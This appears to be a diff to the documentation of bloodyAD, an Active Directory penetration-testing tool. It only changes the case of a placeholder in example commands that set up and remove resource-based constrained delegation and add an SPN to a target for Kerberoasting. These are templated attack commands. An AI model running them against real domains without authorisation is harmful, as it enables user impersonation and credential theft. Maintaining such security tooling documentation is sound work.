@@ -543,7 +543,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add groupMe
 Configure Resource-Based Constrained Delegation to allow a service to impersonate users on a target.
 
 ```sh
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add rbcd <target> <service>
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add rbcd <target> <SERVICE>
 ```
 
 ## Add Shadow Credentials
@@ -643,7 +643,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove obje
 Remove Resource-Based Constrained Delegation configuration from a target.
 
 ```sh
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove rbcd <target> <service>
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove rbcd <target> <SERVICE>
 ```
 
 ## Remove Shadow Credentials
@@ -749,7 +749,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object 
 Add an SPN to a target object for Kerberoasting.
 
 ```sh
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target> servicePrincipalName -v '<service>/<hostname>'
+bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target> servicePrincipalName -v '<SERVICE>/<hostname>'
 ```
 
 ## Enable a Disabled Account
